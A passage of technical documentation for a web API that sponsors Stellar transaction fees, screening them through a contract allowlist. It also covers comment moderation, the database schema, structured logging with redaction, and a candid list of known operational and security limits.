the action log, reputation, feedback and proof-registry contracts — so a
redeploy that changes an id cannot leave a stale allowlist behind. Everything
else is refused:

- **payments, account merges, change-trust, create-account** and any other
  classic operation — none are our product being used;
- **Wasm uploads and contract creation** (the non-invoke host functions) — they
  are expensive and would let someone push arbitrary code on-chain at our
  expense;
- **calls into third-party contracts** — the gate is on the *root* invocation,
  so a stranger's contract is never a valid target. Our own contracts' onward
  cross-contract calls (the action log bumps the reputation contract) are reached
  without appearing at the root, which is correct: trusting what our own code
  calls is not the same as trusting an arbitrary root target.

The **fee ceiling** (0.1 XLM per transaction) and the **5-per-10-minutes** write
limit bound the cost of an attempt, but they are not the primary control — the
attacker's cost per attempt is zero and the sponsor's is not, so no rate limit
alone can protect the balance. The allowlist is what turns "we pay for anything"
into "we pay for our own product being used".

#### The server signs but does not broadcast

The signed fee-bump is returned to the client to submit; the server never
submits it itself. Two reasons, both recorded in the route:

1. Submitting here would make the server the broadcast path for every sponsored
   transaction, so an RPC outage or a slow ledger would turn into the request
   timing out while the fee may or may not have been spent — ambiguous in
   exactly the case where money moved.
2. A submission that fails is the client's to retry: it already holds the wallet,
   the sequence number and the user, and it is the only party that can tell
   whether retrying is the right answer.

#### Honest caveat on `wrong_network`

`wrong_network` is detected by verifying the inner transaction's signatures
against the expected network passphrase — a passphrase is not stored in an
envelope, it is mixed into the hash that gets signed, so a signature that checks
out under our passphrase is the only positive evidence the transaction was built
for our chain. That makes two shapes **undecidable** at this check and therefore
*not* blocked by it: an **unsigned** inner transaction (no signature to test)
and one sourced from a **muxed (`M…`) account** (no single key to test against).
This is acceptable because the check is a courtesy, not the defence: a bump
wrapping an inner transaction the network will reject is never included in a
ledger and so is never charged a fee. The contract allowlist, not this check, is
what stands between the sponsor and a drained balance.

**`SponsorDecision` reasons.** `inspectInnerTransaction` resolves every input to
one of these and never throws; the route maps each to a status.

| Reason | Triggered when | Response |
| --- | --- | --- |
| `not_configured` | The deployment has no usable `SPONSOR_SECRET` (unset, blank, or an unparseable seed). A property of the deployment, not the transaction — checked before inspection. | 503 `upstream_unavailable` (`Fee sponsorship is not configured.`) |
| `malformed` | The XDR will not parse (bad base64, truncated, an envelope variant the SDK cannot read), or it is already a fee-bump. Also recorded when an already-approved transaction fails to build. | 403 `forbidden` from inspection; 503 `upstream_unavailable` on a build failure |
| `fee_too_high` | The inner transaction's total declared fee is non-numeric, negative, or exceeds `MAX_SPONSORED_FEE_STROOPS` (1,000,000 stroops = 0.1 XLM). | 403 `forbidden` |
| `operation_not_allowed` | The operation list is empty, or any operation is not an `invokeHostFunction` whose root invocation targets one of our own contract ids. | 403 `forbidden` |
| `wrong_network` | The inner transaction is signed, has a testable source, and its signatures do not verify against this build's network passphrase. | 403 `forbidden` |

(`ok` is the sixth member of the union — the only verdict that proceeds to a
bump.) A 403 message names the reason (`Fee sponsorship refused: <reason>.`) so a
client can tell "you asked us to pay for the wrong thing" from "your envelope is
broken", but the submitted XDR is never echoed into an error body or a log line.

**Failure statuses**

| Status | Code | When |
| --- | --- | --- |
| 400 | `bad_request` | Body missing/blank, not valid JSON, or not a JSON object. |
| 413 | `payload_too_large` | Body over 98304 bytes (96 KB), by declared `content-length` or measured UTF-8 length. |
| 422 | `validation_failed` | `xdr` absent, non-string, blank, or over 65536 characters (64 KB); the detail is reported under `xdr`. |
| 403 | `forbidden` | `inspectInnerTransaction` refused the envelope — `malformed`, `fee_too_high`, `operation_not_allowed` or `wrong_network` (table above). |
| 503 | `upstream_unavailable` | Sponsorship not configured (`Fee sponsorship is not configured.`), or an approved transaction failed to build (`The fee-bump could not be built.`). |
| 429 | `rate_limited` | More than 5 writes in 10 minutes from the same key. |
| 500 | `internal` | Unexpected throw. |

Each refusal logs `sponsor.refused` with the request id and the reason; a grant
logs `sponsor.granted`; a build failure logs `sponsor.build_failed` with the
underlying error attached. Neither the submitted XDR nor the sponsor secret is
ever written to any of them.

---

## 7. Moderation

`src/lib/api/moderation.ts` screens every comment submitted through
`POST /api/feedback`. It imports no framework and has no dependencies, so the
same function runs in the route handler, in a backfill script, and under plain
node in a unit test.

### The policy is hide, not reject

`moderateComment` never fails a submission. The row is stored and acknowledged
with the same `201 {"ok": true}` as any other, and the verdict only decides
whether the comment is rendered publicly.

Rejecting at the form would tell an abuser precisely which word to change and
hand them a fast retry loop; a silent withhold leaves them believing the post
landed. Keeping the row also preserves the record for human review, and makes a
false positive cost a moderator one flag flip rather than costing a user their
comment.

A withheld submission is inserted with `hidden = true` and logged as
`feedback.withheld` at `warn` level with the request id, the reason and the
wallet — never the comment text itself.

### The four withholding reasons

Checks run in severity order and the first match wins, so the reason a reviewer
sees is the worst thing the comment did rather than the last thing detected.

| Reason | Withheld when |
| --- | --- |
| `abusive_language` | The normalised text contains a listed term as a whole word. |
| `excessive_links` | More than 2 URLs, counting `https?://` and bare `www.` hosts alike. |
| `repetition` | One non-whitespace character repeated more than 15 times in a row, or one whitespace-separated token repeated more than 6 times. |
| `shouting` | The comment is longer than 20 characters **and** more than 70% of its letters are uppercase. The ratio is taken over letters alone, so digits, punctuation and the characters of a wallet address cannot dilute a genuine all-caps rant. |

`clean` is the fifth member of `ModerationReason` and the only one that
publishes. An empty comment is `clean`: validation already rejects it upstream,
and duplicating that rule here would only give the two modules two answers to
drift apart on. Repetition and shouting deliberately read the *original* text,
because normalisation caps character runs at two and discards case — exactly the
evidence those two checks look for.

### Matching is whole-word against a normalised form

`normaliseForMatching` reduces a comment to lowercase `[a-z0-9 ]` before any
term is tested. Each step closes off one cheap evasion: case folding, NFD
decomposition with combining marks stripped (`gágo`), leetspeak mapped back
(`0`→`o`, `1`→`i`, `3`→`e`, `4`→`a`, `5`→`s`, `@`→`a`, `$`→`s`), and any run of
three or more identical characters collapsed to exactly two — two rather than
one so genuinely doubled letters survive, and `fuuuuck` still reduces to
something the single-`u` term matches. Punctuation and whitespace both become
single spaces, which is what makes whole-word matching possible on the result.

Each term is compiled once into a `\b`-anchored pattern in which every character
accepts one or two occurrences. **The anchors are the point: an innocent word
that merely contains a listed term as a substring is safe.** `assess`, `class`
and `Scunthorpe` all publish, where a bare substring search would flag all
three.

`ABUSIVE_TERMS` is the single place to extend when a real submission gets
through. Entries must be lowercase, alphabetised, and written with plain single
spaces between words — normalisation reduces every comment to that alphabet
before matching, so anything else could never match.

### Withheld rows leave both halves of the summary

`GET /api/feedback` applies `WHERE NOT hidden` to the recent list **and** to the
aggregate query. A withheld comment does not appear in the feed, and it does not
inflate `count`, drag `average`, or contribute to `onChain` either. Excluding it
from only the list would leave the dashboard reporting a total that includes a
comment nobody can see. `feedback_visible_created_at_desc_idx` is the partial
index that serves both.

### Every decision is reversible

Automated screening is the first pass, not the last word. An operator can
restore a comment the filter withheld, or withhold one it cleared, with
[`PATCH /api/admin/feedback`](#patch-apiadminfeedback) — the same call either
way, with a different boolean. Because the row was never deleted, the reversal
restores it exactly as submitted.

---

## 8. Data model

`db/schema.sql` is the single source of truth. Apply it with:

```bash
psql "$DATABASE_URL" -f db/schema.sql
```

The script is idempotent — every object uses `IF NOT EXISTS` — and needs no
extensions.

### Table `feedback`

| Column | Type | Constraints |
| --- | --- | --- |
| `id` | `bigint` | `GENERATED ALWAYS AS IDENTITY PRIMARY KEY` |
| `rating` | `smallint` | `NOT NULL`, `feedback_rating_range`: `CHECK (rating BETWEEN 1 AND 5)` |
| `comment` | `text` | `NOT NULL`, `feedback_comment_length`: `CHECK (char_length(comment) BETWEEN 1 AND 280)` |
| `wallet` | `text` | nullable, `feedback_wallet_format`: `CHECK (wallet IS NULL OR wallet ~ '^G[A-Z2-7]{55}$')` |
| `tx_hash` | `text` | nullable, `feedback_tx_hash_format`: `CHECK (tx_hash IS NULL OR tx_hash ~ '^[0-9a-f]{64}$')` |
| `on_chain` | `boolean` | `NOT NULL DEFAULT false`, `feedback_on_chain_requires_tx_hash`: `CHECK (NOT on_chain OR tx_hash IS NOT NULL)` |
| `created_at` | `timestamptz` | `NOT NULL DEFAULT now()` |
| `hidden` | `boolean` | `NOT NULL DEFAULT false`. Set by automated moderation and by `PATCH /api/admin/feedback`. A hidden row is retained for the record and excluded from public reads; it is never deleted. No CHECK — the default carries the invariant. |

### Indexes on `feedback`

| Index | Purpose |
| --- | --- |
| `feedback_created_at_desc_idx` | Serves the `ORDER BY created_at DESC LIMIT 10` recent list. |
| `feedback_on_chain_tx_hash_idx` | Partial (`WHERE on_chain`); serves the on-chain count. |
| `feedback_wallet_idx` | Partial (`WHERE wallet IS NOT NULL`); per-wallet lookups. |
| `feedback_tx_hash_unique_idx` | **Unique**, partial (`WHERE tx_hash IS NOT NULL`); one row per anchoring transaction. Its violation is what becomes the API's 409. |
| `feedback_visible_created_at_desc_idx` | Partial (`WHERE NOT hidden`); serves both halves of `GET /api/feedback`. It supersedes `feedback_created_at_desc_idx` for that query — the unfiltered index still has to read and discard hidden rows, this one never sees them. |

### Table `users`

The onboarding registry for the growth programme: one row per person who signs
up, whether on the site or in a batch imported from the Google Form.

| Column | Type | Constraints |
| --- | --- | --- |
| `id` | `bigint` | `GENERATED ALWAYS AS IDENTITY PRIMARY KEY` |
| `name` | `text` | `NOT NULL`, `users_name_length`: `CHECK (char_length(name) BETWEEN 1 AND 80)` |
| `email` | `text` | `NOT NULL`, `users_email_format`: `CHECK (email ~ '^[^@[:space:]]+@[^@[:space:]]+\.[^@[:space:]]+$')`. Stored lowercase — the API lowercases before insert and the unique index below assumes it. |
| `wallet` | `text` | `NOT NULL`, `users_wallet_format`: `CHECK (wallet ~ '^G[A-Z2-7]{55}$')`. Required here, unlike on `feedback`: the programme is keyed to a wallet. |
| `rating` | `smallint` | nullable, `users_rating_range`: `CHECK (rating IS NULL OR rating BETWEEN 1 AND 5)` |
| `note` | `text` | nullable, `users_note_length`: `CHECK (note IS NULL OR char_length(note) BETWEEN 1 AND 500)` |
| `source` | `text` | `NOT NULL DEFAULT 'site'`, `users_source_allowed`: `CHECK (source IN ('site','form','import'))` — `site` is an on-site signup, `form` a Google Form submission, `import` a backfilled batch. Never accepted from a request. |
| `created_at` | `timestamptz` | `NOT NULL DEFAULT now()` |

### Indexes on `users`

| Index | Purpose |
| --- | --- |
| `users_email_lower_unique_idx` | **Unique** on `lower(email)`; one signup per person, and serves lookup by address. Its violation is one of the two that become the onboard 409. |
| `users_wallet_unique_idx` | **Unique** on `wallet`; one signup per account, so the same wallet cannot enrol twice. The other source of the onboard 409. |
| `users_created_at_desc_idx` | Recent signups and growth over time. |

The API layer and the database enforce the same rules independently. The
validation in `src/lib/api/validation.ts` exists to produce a useful 422; the
CHECK constraints exist so a bug in that layer cannot corrupt the table.

---

## 9. Operations

### Structured logs

Every log line is one JSON object, matching what Vercel's log drain parses:

```json
{"ts":"2026-07-23T09:41:07.882Z","level":"info","event":"request","name":"feedback.create","method":"POST","status":201,"durationMs":63,"requestId":"9f1c0f6a-2b31-4a35-9a1d-2f0f4d5e6c77"}
```

The shape is always `{ts, level, event, ...fields}`. `level` is one of `debug`,
`info`, `warn`, `error`; `debug` is dropped in production.

The `request` event is emitted once per request by the wrapper, carrying `name`
(the stable route label), `method`, `status`, `durationMs` and `requestId`. On
a failure it also carries `code`, and — only when the thrown value was not an
`ApiError` — an `err` field with the raw error attached. Level is `error` for
5xx and `warn` for 4xx.

| Event | Emitted by | Notes |
| --- | --- | --- |
| `request` | `route()` | One per request, always. |
| `feedback.created` | `POST /api/feedback` | `requestId`, `rating`, `onChain`, `wallet`, `txHash`. Wallet and hash are public chain data, so an anchored submission is traceable from the log line to the ledger. |
| `feedback.withheld` | `POST /api/feedback` | `requestId`, `reason`, `wallet`, at `warn` level, when moderation withholds a comment. The comment text is not logged. |
| `feedback.read` / `feedback.write` | feedback route | The real database error, at `error` level, when a query fails. |
| `onboard.created` | `POST /api/onboard` | `requestId`, `wallet`, `rating`. The name and the email are deliberately absent — they are personal data and this log ships to a third-party drain. |
| `onboard.read` / `onboard.write` | onboard route | The real database error, at `error` level, when a query fails. |
| `admin.authorized` | `requireAdmin` | `requestId` only, on every accepted operator request. |
| `admin.denied` | `requireAdmin` | `requestId` and `reason` (`not_configured`, `missing`, `invalid`), at `warn` level. Never the credential, in whole, hashed or truncated. |
| `admin.users.exported` | `GET /api/admin/users` | `requestId` and the row count. Row contents are personal data and are never logged. |
| `admin.users.read` | `GET /api/admin/users` | The real database error, at `error` level. |
| `admin.feedback.moderated` | `PATCH /api/admin/feedback` | `requestId`, `id`, `hidden` — the audit trail for one moderation decision. |
| `admin.feedback.write` | `PATCH /api/admin/feedback` | The real database error, at `error` level. |
| `health.database` | `GET /api/health` | The real cause behind a degraded database check. |
| `health.chain` | `GET /api/health` | The real cause when the chain check cannot reach the RPC, at `error` level. |
| `health.chain.mismatch` | `GET /api/health` | `requestId` and the expected `network`, at `error` level, when the RPC answers with the wrong passphrase. |
| `sponsor.refused` | `POST /api/sponsor` | `requestId` and `reason`, at `warn` level, on any refusal. Never the submitted XDR. |
| `sponsor.granted` | `POST /api/sponsor` | `requestId` and `reason`, when a bump is signed. |
| `sponsor.build_failed` | `POST /api/sponsor` | The underlying error, at `error` level, when an approved transaction fails to build. The sponsor secret is not in it. |

**Redaction.** Field values are masked with `[redacted]` when the *key name*
matches `secret`, `token`, `password`, `key`, `authorization`, `cookie`,
`database_url` or `connection` (case-insensitive). Matching is by key name
only and is not recursive — keep anything sensitive at the top level of the
fields you log. `Error` values are converted to `{name, message}`, plus `stack`
outside production, so `JSON.stringify` does not silently drop them.

To trace one request end to end, take the `x-request-id` from the response and
grep the logs for it — the wrapper's `request` line and any route-level event
share it.

### Uptime monitoring

Point the monitor at `GET /api/health` and alarm on any non-200. No body
parsing is required: 200 means every check passed, 503 means at least one
failed. The response is `no-store`, so an intermediary will not serve a stale
healthy answer. When an alarm fires, take `requestId` from the body, note which check reports
`status: "error"`, and search the logs for the matching `health.database`,
`health.chain` or `health.chain.mismatch` line under that id to see the real
cause.

---

## 10. Known limits

- **Rate limiting is per instance.** Counters live in one process's memory.
  With several concurrent Vercel instances the effective global ceiling is
  roughly `limit × instances`, and an instance that scales to zero forgets its
  counters. It is a spam speed bump, not a security control. A shared store
  (Redis/Upstash) is the fix when traffic justifies it.
- **The public endpoints are unauthenticated.** Both feedback routes, both
  onboard routes and the health probe take no credential, and only
  `/api/admin/*` does. This is deliberate — it is public feedback and a public
  signup form, and requiring an account would defeat the point. A `wallet` in
  either body is self-reported and is not proof of key ownership; only an
  anchored `txHash` is, and that anchor is resolved against Horizon before it
  counts (see [On-chain claims are verified](#on-chain-claims-are-verified-not-trusted)).
  Binding an *unanchored* wallet to its owner would need a signed challenge,
  which is not implemented — so a signup can reserve a wallet address its
  submitter does not control, and the unique index will then keep the real owner
  out until an operator clears the row by hand.
- **The admin gate is one shared secret.** `ADMIN_TOKEN` is a single
  process-wide value with no rotation mechanism, no expiry and no way to tell
  one holder from another. Revoking access for one person means changing the
  secret for everyone and redeploying. The audit trail is the log stream and
  nothing beyond it: `admin.authorized` and `admin.denied` carry a request id,
  not an identity, so "who exported the registry on Tuesday" is only ever
  answerable as "someone holding the token". A second operator is the point at
  which this needs replacing with per-person credentials.
- **The moderation word list is finite and language-specific.**
  `ABUSIVE_TERMS` covers English and Tagalog/Filipino only, and is intentionally
  short rather than exhaustive — length buys little and costs false positives.
  Novel abuse, a third language, an evasion normalisation does not reach, and
  anything cruel written without a listed word in it all pass the filter. The
  link, repetition and shouting checks are thresholds, not judgement. Treat it
  as catching the obvious cases; the operator override exists precisely because
  it will miss the rest.
- **`users` holds personal data with no retention policy.** Names and email
  addresses are stored indefinitely. There is no deletion endpoint, no expiry,
  no subject-access export and no consent record beyond the form itself, so
  removing one person means a manual `DELETE` against production. The API keeps
  that data out of responses and out of logs, but that is minimisation, not a
  lifecycle. Anything resembling a real privacy obligation needs a documented
  retention window and an erasure path.
- **`CREATE TABLE IF NOT EXISTS` will not retrofit constraints.** Re-running
  `db/schema.sql` against a database where `feedback` already exists is a no-op
  for the table body: new CHECK constraints and column changes are *not*
  applied. Only the `CREATE INDEX IF NOT EXISTS` statements add anything. An
  existing database needs explicit `ALTER TABLE ...` statements.
  `db/migrations/001_harden_feedback.sql` is exactly that: it normalises the
  affected columns, adds all five constraints `NOT VALID` so they guard new
  writes without locking the table for a full scan, and documents the
  `VALIDATE CONSTRAINT` step to promote them once the historical rows check out.
  `db/migrations/002_users_and_moderation.sql` adds `feedback.hidden`, its
  partial index and the whole `users` table, and needs no `NOT VALID` step: the
  new column carries a non-null default rather than a constraint, and `users` is
  a brand new table with no legacy rows for a constraint to trip over.
- **The fee sponsor is a hot key with a per-instance spend ceiling.** The
  account that pays for sponsored transactions signs from a seed held in the
  `SPONSOR_SECRET` environment variable — a hot key on a public route, so its
  balance is the blast radius of any bug in the allowlist and it should be funded
  with only what you are willing to lose and rotated the moment it is even
  suspected of leaking. The allowlist itself is only as good as the contract-id
  list in `src/config/contract.ts`: a wrong or stale id there either refuses
  legitimate traffic or, worse, sponsors calls into a contract that is no longer
  ours. And the rate limit that is supposed to cap spend is the same per-instance
  counter as everywhere else — with several concurrent Vercel instances the real
  ceiling is roughly `5 × instances` bumps per ten minutes, not five, so the true
  worst-case spend scales with how many instances are live. None of these is the
  primary control; the positive contract allowlist is, and these are the reasons
  it has to be.
- **`x-request-id` is caller-controlled.** It is echoed as sent (capped at 200
  characters) and is a correlation aid, not an authenticated identifier.
